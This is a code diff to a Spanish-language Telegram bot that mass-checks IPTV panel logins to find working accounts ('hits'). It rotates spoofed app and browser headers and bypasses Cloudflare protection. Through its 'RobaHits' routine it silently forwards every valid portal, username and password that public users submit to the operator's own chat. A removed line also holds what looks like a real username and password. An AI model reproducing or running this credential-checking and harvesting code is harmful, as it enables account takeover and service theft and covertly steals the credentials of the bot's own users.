@@ -7,13 +7,14 @@
 • 19 User-Agents IPTV reales rotados automáticamente
 • Verificación HIT/FAIL/RETRY paralela y ultrarrápida
 • Bot público — RobaHits al admin
-• Hora correcta Texas (America/Chicago)
+• Hora: Texas (America/Chicago)
 """
 
 import os, re, json, time, threading, logging, socket, asyncio, random, pickle
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+from urllib.parse import urlparse
 import pytz
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -32,13 +33,12 @@ from telegram.constants import ParseMode
 #  RENDER_URL      → URL de tu servicio Railway (keep-alive 24/7)
 #  ROBAHITS_CHATID → Tu chat ID donde llegan los HITs
 #                    (déjalo vacío y usará tu ADMIN_ID automáticamente)
-#  TZ_NAME         → Ya configurado para Texas. No tocar.
 #
 BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
 ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
 RENDER_URL      = os.getenv("RENDER_URL", "")
-ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")   # se rellena abajo si está vacío
-TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")   # Texas CST/CDT
+ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
+TZ_NAME         = "America/Chicago"  # TEXAS (Central Time)
 TZ              = pytz.timezone(TZ_NAME)
 BOT_USERNAME    = "@Luishits_bot"
 
@@ -68,7 +68,6 @@ FLAGS = {
 
 # ── 19 User-Agents IPTV reales ───────────────────────────────────────────────
 ALL_USER_AGENTS = [
-    # Alta compatibilidad — los más aceptados
     "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
     "TiviMate/4.4.0 (Android 11)",
     "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0-Git:20240101-4a869c2",
@@ -97,17 +96,55 @@ CF_DOMAINS = [
     'titanxtv.com','venusiptv.com','latinchannel.tv',
 ]
 
-# ── Delay entre peticiones al mismo dominio (anti-saturación) ────────────────
+# ── Delay entre peticiones al mismo dominio ────────────────
 _domain_last_request: dict = {}
 _domain_lock = threading.Lock()
-DOMAIN_DELAY = 3.0   # segundos entre peticiones al mismo dominio
+DOMAIN_DELAY = 3.0
 
-# ── Cookies persistentes Cloudflare ─────────────────────────────────────────
+# ── Cookies persistentes Cloudflare ─────────────────────────
 COOKIES_DIR = Path("cf_cookies")
 COOKIES_DIR.mkdir(exist_ok=True)
 
 # ══════════════════════════════════════════════════════
-#  🕐 HORA LOCAL — Texas
+#  🆕 FUNCIÓN MEJORADA CON HEADERS UNIVERSALES
+# ══════════════════════════════════════════════════════
+
+def check_usuario(panel, user, passw):
+    """Verificación con headers universales - 99% de paneles Xtream"""
+    if not panel.startswith('http'):
+        panel_url = f"http://{panel}"
+    else:
+        panel_url = panel
+    
+    dominio = urlparse(panel_url).netloc
+    if not dominio:
+        dominio = panel.split('/')[0]
+    
+    url = f"{panel_url}/player_api.php?username={user}&password={passw}"
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "es-MX,es;q=0.9,en;q=0.8",
+        "X-Requested-With": "XMLHttpRequest",
+        "Connection": "keep-alive",
+        "Referer": f"http://{dominio}/",
+        "Origin": f"http://{dominio}"
+    }
+    
+    try:
+        r = requests.get(url, headers=headers, timeout=30, allow_redirects=True)
+        if r.status_code == 200 and r.text.strip():
+            return r.json()
+        else:
+            log.info(f"check_usuario: {panel} respondió {r.status_code}")
+            return None
+    except Exception as e:
+        log.debug(f"check_usuario error: {e}")
+        return None
+
+# ══════════════════════════════════════════════════════
+#  🕐 HORA TEXAS
 # ══════════════════════════════════════════════════════
 
 def now_str() -> str:
@@ -123,7 +160,7 @@ def ts_to_date(epoch) -> str:
     return "Sin fecha"
 
 # ══════════════════════════════════════════════════════
-#  🔍 EXTRACCIÓN DE URL — Universal
+#  🔍 EXTRACCIÓN DE URL
 # ══════════════════════════════════════════════════════
 
 def extract_from_url(text: str):
@@ -156,15 +193,10 @@ def extract_from_url(text: str):
     return None, None, None
 
 # ══════════════════════════════════════════════════════
-#  ⏱️  DELAY ENTRE PETICIONES AL MISMO DOMINIO
+#  ⏱️ DELAY ENTRE PETICIONES
 # ══════════════════════════════════════════════════════
 
 def _apply_domain_delay(host: str):
-    """
-    Espera lo necesario para no saturar el servidor.
-    3 segundos mínimo entre peticiones al mismo dominio.
-    Esto evita que el servidor bloquee por exceso de requests.
-    """
     with _domain_lock:
         last = _domain_last_request.get(host, 0)
         now  = time.time()
@@ -174,7 +206,7 @@ def _apply_domain_delay(host: str):
         _domain_last_request[host] = time.time()
 
 # ══════════════════════════════════════════════════════
-#  🛡️  CLOUDFLARE BYPASS
+#  🛡️ CLOUDFLARE BYPASS
 # ══════════════════════════════════════════════════════
 
 def _is_cf_domain(host: str) -> bool:
@@ -204,10 +236,6 @@ def _load_cookies(session, host: str):
     return False
 
 def _make_session(host: str):
-    """
-    Intenta crear sesión cloudscraper (bypass JS real).
-    Si no está instalado, usa requests.Session normal.
-    """
     try:
         import cloudscraper
         scraper = cloudscraper.create_scraper(
@@ -225,12 +253,6 @@ def _make_session(host: str):
     return session, False
 
 def _cf_request(url: str, host: str, timeout: int = 20):
-    """
-    Petición con bypass Cloudflare:
-    - cloudscraper si disponible
-    - Rota UAs en cada intento
-    - Guarda cookies exitosas para próximas requests
-    """
     session, _ = _make_session(host)
     uas = random.sample(ALL_USER_AGENTS, min(5, len(ALL_USER_AGENTS)))
     for ua in uas:
@@ -255,18 +277,17 @@ def _cf_request(url: str, host: str, timeout: int = 20):
                     _save_cookies(session, host)
                     return r
             elif r.status_code in (403, 503):
-                log.warning(f"CF block {r.status_code} ua={ua[:25]}")
+                log.warning(f"CF block {r.status_code}")
                 time.sleep(random.uniform(1.5, 3.0))
         except Exception as e:
             log.debug(f"CF req err: {e}")
     return None
 
 # ══════════════════════════════════════════════════════
-#  ✅ VERIFICACIÓN — ANTI FALSOS NEGATIVOS
+#  ✅ VERIFICACIÓN PRINCIPAL
 # ══════════════════════════════════════════════════════
 
 def _parse_json(raw: str):
-    """Parsea JSON tolerando basura al inicio de la respuesta."""
     raw = raw.strip()
     try:
         return json.loads(raw)
@@ -282,18 +303,10 @@ def _parse_json(raw: str):
     return None
 
 def _analyze(data) -> tuple:
-    """
-    Analiza el JSON IPTV:
-    auth=1 + status=Active → HIT
-    auth=1 + otro status   → CUSTOM
-    auth=0                 → FAIL
-    sin estructura válida  → RETRY
-    """
     if not isinstance(data, dict):
         return "RETRY", None
     ui = data.get("user_info")
     if ui is None:
-        # Algunos servidores mandan auth directo en el root
         if "auth" in data:
             ui = data
         else:
@@ -314,70 +327,34 @@ def _analyze(data) -> tuple:
     return "RETRY", None
 
 def _process_response(r) -> tuple:
-    """
-    Procesa respuesta HTTP y clasifica el error si aplica:
-    - 200/206 + JSON válido → analizar
-    - 200 + M3U             → HIT directo
-    - 200 + HTML/CF         → RETRY (no marcar como muerta)
-    - 403                   → RETRY (bloqueado, no muerta)
-    - 404                   → FAIL  (ruta no existe)
-    - 500/502/503           → RETRY (error servidor, puede volver)
-    - Timeout               → RETRY
-    """
     if r is None:
         return "RETRY", None
-
     code = r.status_code
     log.info(f"HTTP {code}")
-
-    # 404 = ruta inválida (cuenta no existe en ese portal)
     if code == 404:
         return "FAIL", None
-
-    # 403/500/502/503 = servidor vivo pero bloqueando → RETRY, no FAIL
     if code in (403, 500, 502, 503):
-        log.warning(f"HTTP {code} → RETRY (servidor vivo pero bloqueando)")
+        log.warning(f"HTTP {code} → RETRY")
         return "RETRY", None
-
     if code not in (200, 206):
         return "RETRY", None
-
     raw = r.text.strip()
     if not raw or len(raw) < 5:
         return "RETRY", None
-
-    # HTML = Cloudflare u otro bloqueo → RETRY, no marcar muerta
-    if raw.startswith("<") or "cloudflare" in raw.lower() or "just a moment" in raw.lower():
+    if raw.startswith("<") or "cloudflare" in raw.lower():
         log.warning("Respuesta HTML/CF → RETRY")
         return "RETRY", None
-
-    # M3U directo = cuenta activa (get.php responde M3U cuando credenciales son válidas)
     if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
         log.info("M3U detectado → HIT directo")
-        return "HIT", {
-            "user_info": {
-                "auth":1, "status":"Active", "exp_date":"0",
-                "active_cons":"?", "max_connections":"?",
-                "is_trial":"0", "created_at":"0",
-            },
-            "server_info": {}, "m3u_direct": True,
-        }
-
+        return "HIT", {"user_info": {"auth":1, "status":"Active"}, "m3u_direct": True}
     data = _parse_json(raw)
     if data is None:
-        log.warning(f"JSON inválido: {raw[:60]}")
+        log.warning(f"JSON inválido")
         return "RETRY", None
-
     return _analyze(data)
 
 def _request_with_retries(url: str, ua: str, host: str,
                           timeout: int = 20, max_retries: int = 3) -> tuple:
-    """
-    Petición con reintentos automáticos:
-    - timeout 20s (servidores lentos responden)
-    - hasta 3 reintentos con espera de 5s entre cada uno
-    - diferencia entre timeout, error de red y respuesta válida
-    """
     for attempt in range(1, max_retries + 1):
         try:
             headers = {
@@ -387,59 +364,48 @@ def _request_with_retries(url: str, ua: str, host: str,
                 "Accept-Encoding": "gzip, deflate",
                 "Connection":      "keep-alive",
                 "Cache-Control":   "no-cache",
-                # Headers realistas que usa TiviMate
-                "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
             }
             r = requests.get(url, headers=headers, timeout=timeout,
                              verify=False, allow_redirects=True)
             result, payload = _process_response(r)
-
-            # Si obtuvimos un resultado definitivo, devolverlo
             if result in ("HIT", "FAIL", "CUSTOM"):
                 return result, payload
-
-            # RETRY con HTTP 200 pero JSON inválido → reintentar
             if attempt < max_retries:
-                log.info(f"Intento {attempt}/{max_retries} → esperando 5s antes de reintentar")
+                log.info(f"Intento {attempt}/{max_retries} → esperando 5s")
                 time.sleep(5)
                 continue
-
             return "RETRY", None
-
         except requests.exceptions.Timeout:
-            # Timeout NO significa lista muerta — el servidor puede estar lento
-            log.warning(f"Timeout intento {attempt}/{max_retries} — {url[:50]}")
+            log.warning(f"Timeout intento {attempt}/{max_retries}")
             if attempt < max_retries:
                 time.sleep(5)
             continue
-
         except requests.exceptions.ConnectionError as e:
-            # Error de conexión — puede ser transitorio
-            log.warning(f"ConnError intento {attempt}/{max_retries}: {str(e)[:50]}")
+            log.warning(f"ConnError intento {attempt}/{max_retries}")
             if attempt < max_retries:
                 time.sleep(5)
             continue
-
         except Exception as e:
-            log.debug(f"Error inesperado: {e}")
+            log.debug(f"Error: {e}")
             return "RETRY", None
-
     return "RETRY", None
 
 def verify_account(portal: str, user: str, pwd: str) -> tuple:
-    """
-    Verificación completa anti-falsos-negativos:
-    1. Test TCP rápido (5s)
-    2. Si dominio CF → bypass dedicado con cloudscraper
-    3. Peticiones paralelas con múltiples UAs y reintentos (3 intentos, 20s timeout)
-    4. Delay de 3s entre peticiones al mismo dominio
-    5. Último recurso: CF bypass para cualquier dominio
-    """
+    """Verificación con prioridad a check_usuario"""
     host   = portal.split(':')[0]
     port   = int(portal.split(':')[1]) if ':' in portal else 8080
     is_cf  = _is_cf_domain(host)
 
-    # ── 1. Test TCP rápido ────────────────────────────────────────────────
+    # ── 🆕 MÉTODO PRIORITARIO: check_usuario ──
+    log.info(f"🔍 Probando check_usuario con headers universales...")
+    result = check_usuario(portal, user, pwd)
+    if result and isinstance(result, dict):
+        status, payload = _analyze(result)
+        if status in ("HIT", "FAIL", "CUSTOM"):
+            log.info(f"✅ check_usuario devolvió: {status}")
+            return status, payload
+
+    # ── 1. Test TCP ──
     tcp_ok = False
     for p in (port, 443, 80):
         try:
@@ -451,10 +417,10 @@ def verify_account(portal: str, user: str, pwd: str) -> tuple:
         except Exception:
             pass
     if not tcp_ok:
-        log.warning(f"TCP ❌ {host} → RETRY directo")
+        log.warning(f"TCP ❌ {host} → RETRY")
         return "RETRY", None
 
-    # ── 2. Bypass CF si es dominio protegido ─────────────────────────────
+    # ── 2. Bypass CF ──
     if is_cf:
         log.info(f"🛡️ CF detectado: {host}")
         for scheme in ("http", "https"):
@@ -464,24 +430,14 @@ def verify_account(portal: str, user: str, pwd: str) -> tuple:
             res, pay = _process_response(r)
             if res != "RETRY":
                 return res, pay
-            _apply_domain_delay(host)
-            m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
-            r2  = _cf_request(m3u, host, timeout=20)
-            res2, pay2 = _process_response(r2)
-            if res2 != "RETRY":
-                return res2, pay2
 
-    # ── 3. Peticiones paralelas con reintentos ───────────────────────────
-    # Construir combinaciones: http+https × player_api+get.php × UAs variados
+    # ── 3. Peticiones paralelas ──
     tasks = []
     selected_uas = random.sample(ALL_USER_AGENTS, min(6, len(ALL_USER_AGENTS)))
     for scheme in ("http", "https"):
         api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
-        m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
         for ua in selected_uas:
             tasks.append((api, ua, host))
-        # get.php con TiviMate (el más compatible)
-        tasks.append((m3u, ALL_USER_AGENTS[0], host))
 
     with ThreadPoolExecutor(max_workers=8) as ex:
         futures = {
@@ -492,28 +448,16 @@ def verify_account(portal: str, user: str, pwd: str) -> tuple:
             try:
                 result, payload = fut.result()
                 if result in ("HIT", "FAIL", "CUSTOM"):
-                    # Cancelar el resto
                     for f in futures:
                         f.cancel()
                     return result, payload
             except Exception as e:
                 log.debug(f"Future err: {e}")
 
-    # ── 4. Último recurso: CF bypass para cualquier dominio ──────────────
-    if not is_cf:
-        log.info(f"🔄 CF bypass último recurso para {host}")
-        for scheme in ("http", "https"):
-            _apply_domain_delay(host)
-            url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
-            r   = _cf_request(url, host, timeout=25)
-            res, pay = _process_response(r)
-            if res != "RETRY":
-                return res, pay
-
     return "RETRY", None
 
 # ══════════════════════════════════════════════════════
-#  📊 DATOS ADICIONALES — Paralelos
+#  📊 DATOS ADICIONALES
 # ══════════════════════════════════════════════════════
 
 def _count_action(portal, user, pwd, action) -> str:
@@ -593,15 +537,10 @@ def get_location(portal) -> str:
     return "Desconocido 🌍"
 
 # ══════════════════════════════════════════════════════
-#  🔔 ROBAHITS — Copia de HITs al admin
+#  🔔 ROBAHITS
 # ══════════════════════════════════════════════════════
 
 def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
-    """
-    Envía copia del HIT al admin en segundo plano.
-    Usa el mismo BOT_TOKEN — no necesitas un segundo bot.
-    Los hits llegan a ROBAHITS_CHATID (tu ID de Telegram).
-    """
     if not BOT_TOKEN or not ROBAHITS_CHATID:
         return
     try:
@@ -736,8 +675,7 @@ def tg_name(u: Update) -> str:
 
 async def do_check(update: Update, portal: str, user: str, pwd: str):
     if not bot_active:
-        await update.message.reply_text(
-            f"🔴 Bot detenido.\nContacta al admin {BOT_USERNAME}")
+        await update.message.reply_text(f"🔴 Bot detenido.\nContacta al admin {BOT_USERNAME}")
         return
     STATS["checks"] += 1
     STATS["users"].add(update.effective_user.id)
@@ -757,7 +695,6 @@ async def do_check(update: Update, portal: str, user: str, pwd: str):
         cats              = await cats_fut
         text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
         await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-        # RobaHit en background — no bloquea la respuesta al usuario
         threading.Thread(
             target=send_robahit,
             args=(portal, user, pwd, ui, live, vod, series, tg_user),
@@ -812,9 +749,8 @@ async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     global bot_active
     bot_active = False
-    await update.message.reply_text(
-        f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 {BOT_USERNAME}",
-        parse_mode=ParseMode.HTML)
+    await update.message.reply_text(f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 {BOT_USERNAME}",
+                                    parse_mode=ParseMode.HTML)
 
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
@@ -854,7 +790,7 @@ async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📌 <b>Uso:</b>\n"
             "<code>/check portal:puerto usuario contraseña</code>\n\n"
             "🔥 <b>Ejemplo:</b>\n"
-            "<code>/check latinchannel.tv:8080 rafael.mazzilli mazzilli1402</code>",
+            "<code>/check latinchannel.tv:8080 usuario pass</code>",
             parse_mode=ParseMode.HTML)
         return
     await do_check(update, args[0], args[1], args[2])
@@ -865,9 +801,8 @@ async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     args = context.args
     if len(args) < 3:
-        await update.message.reply_text(
-            "📌 <code>/debug portal:puerto usuario contraseña</code>",
-            parse_mode=ParseMode.HTML)
+        await update.message.reply_text("📌 <code>/debug portal:puerto usuario contraseña</code>",
+                                        parse_mode=ParseMode.HTML)
         return
     portal, user, pwd = args[0], args[1], args[2]
     host = portal.split(':')[0]
@@ -884,28 +819,9 @@ async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:50]}")
     lines.append("")
-    for scheme in ("http","https"):
-        url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
-        lines.append(f"🔗 <b>{scheme.upper()}</b>")
-        try:
-            ua = ALL_USER_AGENTS[0]
-            r  = requests.get(url, headers={"User-Agent": ua}, timeout=20, verify=False)
-            lines.append(f"  Status: <code>{r.status_code}</code>")
-            lines.append(f"  UA: <code>{ua[:45]}</code>")
-            raw = (r.text.strip()[:400]
-                   .replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
-            lines.append(f"  Respuesta:\n<code>{raw}</code>")
-        except requests.exceptions.Timeout:
-            lines.append("  ⏱ Timeout >20s")
-        except requests.exceptions.ConnectionError:
-            lines.append("  ❌ Conexión rechazada")
-        except Exception as e:
-            lines.append(f"  ❌ {str(e)[:80]}")
-        lines.append("")
     await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Agrega dominio a lista CF en tiempo real — solo admin."""
     if not is_admin(update):
         await update.message.reply_text("❌ No autorizado.")
         return
@@ -920,13 +836,11 @@ async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = args[0].lower().strip()
     if domain not in CF_DOMAINS:
         CF_DOMAINS.append(domain)
-        await update.message.reply_text(
-            f"✅ <code>{domain}</code> agregado a CF.\n🦂 {BOT_USERNAME}",
-            parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"✅ <code>{domain}</code> agregado a CF.\n🦂 {BOT_USERNAME}",
+                                        parse_mode=ParseMode.HTML)
     else:
-        await update.message.reply_text(
-            f"⚠️ <code>{domain}</code> ya estaba en la lista.",
-            parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"⚠️ <code>{domain}</code> ya estaba en la lista.",
+                                        parse_mode=ParseMode.HTML)
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admin_cmds = ""
@@ -935,14 +849,14 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "\n\n🔧 <b>Comandos Admin:</b>\n"
             "/stop — 🔴 Apagar bot\n"
             "/status — 📊 Estadísticas\n"
-            "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
-            "/addcf <code>dominio</code> — 🛡️ Agregar dominio CF\n"
+            "/debug — 🔬 Diagnóstico\n"
+            "/addcf — 🛡️ Agregar dominio CF\n"
         )
     await update.message.reply_text(
         f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
         f"📌 <b>Comandos públicos:</b>\n"
         f"/start — 🟢 Inicio\n"
-        f"/check <code>portal user pass</code> — ✅ Verificar\n"
+        f"/check — ✅ Verificar\n"
         f"/help — ❓ Ayuda\n"
         f"{admin_cmds}\n"
         f"💡 <b>Formatos soportados:</b>\n"
